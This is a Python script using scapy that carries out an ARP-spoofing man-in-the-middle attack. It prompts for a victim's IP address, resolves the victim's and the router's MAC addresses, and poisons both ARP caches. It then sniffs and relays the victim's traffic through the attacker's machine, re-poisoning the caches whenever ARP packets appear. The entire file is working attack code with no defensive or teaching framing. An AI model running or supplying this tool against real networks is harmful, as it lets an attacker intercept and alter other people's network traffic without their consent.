from scapy.all import *

def split_mac(pkt):
	pkt = str(pkt)
	mac = pkt.split('hwsrc=')[1]
	# print mac
	# 4c:eb:42:c4:48:1b psrc=192.168.25.2 hwdst=00:0c:29:ae:03:57 pdst=192.168.25.3
	# |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>)]
	real_mac = mac.split(' psrc=')[0]

	return real_mac

def arp_poison(victim_ip, victim_mac, router_ip, router_mac):
	# poisoning router
	sendp(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac))
	
	# poisoning victim
	sendp(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac))

def del_chksum(pkt):
	# delete IP pkt's chksum & len
	del pkt[IP].chksum
	del pkt[IP].len

	# if pkt is UDP pkt, we should delete UPD pkt's chksum, len
	if pkt.haslayer(UDP) == True:
		del pkt[UDP].chksum
		del pkt[UDP].len

# input victim's ip
victim_ip = raw_input("Input victim ip : ")
# find victim's mac address
ans, unans = sr(ARP(op=ARP.who_has, pdst=victim_ip))

# print ans
#[(<ARP  op=who-has pdst=192.168.25.2 |>,
# <ARP  hwtype=0x1 ptype=0x800 hwlen=6 plen=4 op=is-at hwsrc=4c:eb:42:c4:48:1b psrc=192.168.25.2 hwdst=00:0c:29:ae:03:57 pdst=192.168.25.3
# |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>)]
victim_mac = split_mac(ans)
#print victim_mac

# find my ip and mac address
ans = str(ans)
my = ans.split('hwdst=')[1]
my_mac = my.split(' pdst=')[0]
my_ip = my.split(' pdst=')[1].split(' |')[0]

# find router's ip
p = sr1(IP(dst="www.google.com", ttl=0)/ICMP())
router_ip = p.src
# print p.src

# arp request to router and find router's mac address
ans, unans = sr(ARP(op=ARP.who_has, pdst=router_ip))
router_mac = split_mac(ans)
#print router_mac

print "####################################"
print "victim's ip  : " + victim_ip
print "victim's mac : " + victim_mac
print "router's ip  : " + router_ip
print "router's mac : " + router_mac
print "my ip        : " + my_ip
print "my mac       : " + my_mac
print "####################################"

arp_poison(victim_ip, victim_mac, router_ip, router_mac)

def pkt_monitor(pkt):
	if ARP in pkt:	# if packet is arp pkt, re poisoning
		arp_poison(victim_ip, victim_mac, router_ip, router_mac)

	else:	# if packet is not arp pkt, we should delete checksum and len in IP, UDP pkt
		# find pkt what has src or dst victim's ip
		if pkt[IP].dst == victim_ip:
			# modify mac
			pkt[Ether].src = my_mac
			pkt[Ether].dst = victim_mac

		# if dst is victim's ip
		if pkt[IP].dst == router_ip:
			# modify mac
			pkt[Ether].src = my_mac
			pkt[Ether].dst = router_mac

		# delete checksum and len
		del_chksum(pkt)
		sendp(pkt)

while 1:
	sniff(prn=lambda x:pkt_monitor(x), filter="host " + victim_ip + " or host " + router_ip, count=1)